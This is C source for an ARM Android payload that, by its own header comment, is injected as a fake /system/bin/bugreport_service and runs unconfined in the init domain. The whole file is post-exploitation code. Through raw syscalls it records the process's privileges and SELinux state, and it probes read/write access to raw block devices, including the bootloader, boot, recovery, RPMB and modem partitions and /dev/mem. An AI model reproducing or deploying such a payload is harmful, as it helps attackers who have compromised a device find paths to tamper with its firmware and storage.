/* bp - syscall-only ARM payload injected as /system/bin/bugreport_service.
 * Runs in init domain (no seclabel). Writes findings to files AND /dev/kmsg. */
#define SYS_exit   1
#define SYS_read   3
#define SYS_write  4
#define SYS_open   5
#define SYS_close  6
#define SYS_getuid 24
#define SYS_getgid 47
#define SYS_geteuid 49
#define SYS_getegid 50

#define O_RDONLY 0
#define O_WRONLY 1
#define O_RDWR   2
#define O_CREAT  64
#define O_TRUNC  512

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a; register long r1 asm("r1") = b;
    register long r2 asm("r2") = c; register long r3 asm("r3") = d;
    register long r4 asm("r4") = e; register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0" : "+r"(r0)
        : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
        : "r7", "memory");
    return r0;
}
static long slen(const char*s){ long n=0; while(s[n]) n++; return n; }
static long O, K;
static void W(long fd, const char*s){ if(fd>=0) sc6(SYS_write,fd,(long)s,slen(s),0,0,0); }
static void wh(long v, int ndig){
    char b[24]; const char*h="0123456789abcdef"; int i; b[0]='0'; b[1]='x';
    for(i=0;i<ndig;i++) b[2+i]=h[(v>>((ndig-1-i)*4))&0xf]; b[2+ndig]='\n'; b[3+ndig]=0;
    W(O,b); W(K,b);
}
static void log2(const char*s){ W(O,s); W(K,s); }
static void catf(const char*path){
    char b[256]; long fd=sc6(SYS_open,(long)path,O_RDONLY,0,0,0,0), n;
    log2("  "); log2(path); log2(" -> ");
    if(fd<0){ wh(fd,8); return; }
    n=sc6(SYS_read,fd,(long)b,200,0,0,0);
    if(n>0){ for(long i=0;i<n;i++) if(b[i]=='\n') b[i]='|'; b[n]=0; log2(b); }
    else wh(n,8);
    sc6(SYS_close,fd,0,0,0,0,0);
    log2("\n");
}
static void prw(const char*path){
    long fd=sc6(SYS_open,(long)path,O_RDWR,0,0,0,0);
    log2("  rw "); log2(path); log2(" = "); wh(fd,8);
    if(fd>=0) sc6(SYS_close,fd,0,0,0,0,0);
}
static void prd(const char*path){
    char b[64]; long fd=sc6(SYS_open,(long)path,O_RDONLY,0,0,0,0), n;
    log2("  rd "); log2(path); log2(" = ");
    if(fd<0){ wh(fd,8); return; }
    n=sc6(SYS_read,fd,(long)b,64,0,0,0);
    log2("n="); wh(n,8);
    sc6(SYS_close,fd,0,0,0,0,0);
}
static void num(const char*tag, long v){ log2("  "); log2(tag); log2("="); wh(v,8); }

void _start(void)
{
    char buf[8];
    O = sc6(SYS_open,(long)"/data/local/tmp/bp.txt",O_WRONLY|O_CREAT|O_TRUNC,0666,0,0,0);
    if(O<0) O = sc6(SYS_open,(long)"/data/bp.txt",O_WRONLY|O_CREAT|O_TRUNC,0666,0,0,0);
    if(O<0) O = sc6(SYS_open,(long)"/bp.txt",O_WRONLY|O_CREAT|O_TRUNC,0666,0,0,0);
    K = sc6(SYS_open,(long)"/dev/kmsg",O_WRONLY,0,0,0,0);
    log2("=== BP payload (bugreport_service, no seclabel) ===\n");
    num("uid",  sc6(SYS_getuid,0,0,0,0,0,0));
    num("euid", sc6(SYS_geteuid,0,0,0,0,0,0));
    num("gid",  sc6(SYS_getgid,0,0,0,0,0,0));
    num("egid", sc6(SYS_getegid,0,0,0,0,0,0));
    catf("/proc/self/attr/current");
    catf("/proc/1/attr/current");
    log2("-- block devices --\n");
    prw("/dev/block/mmcblk0");
    prd("/dev/block/mmcblk0");
    prw("/dev/block/mmcblk0rpmb");
    prw("/dev/block/bootdevice/by-name/perm");
    prw("/dev/block/bootdevice/by-name/blog");
    prw("/dev/block/bootdevice/by-name/aboot");
    prw("/dev/block/bootdevice/by-name/boot");
    prw("/dev/block/bootdevice/by-name/recovery");
    prw("/dev/mem");
    prw("/dev/block/mmcblk0boot0");
    log2("-- selinux fs --\n");
    catf("/sys/fs/selinux/enforce");
    catf("/sys/fs/selinux/policyvers");
    log2("-- modules --\n");
    prw("/dev/block/bootdevice/by-name/modem");
    log2("=== BP done ===\n");
    if(O>=0) sc6(SYS_close,O,0,0,0,0,0);
    if(K>=0) sc6(SYS_close,K,0,0,0,0,0);
    (void)buf;
    sc6(SYS_exit,0,0,0,0,0,0);
    for(;;){}
}
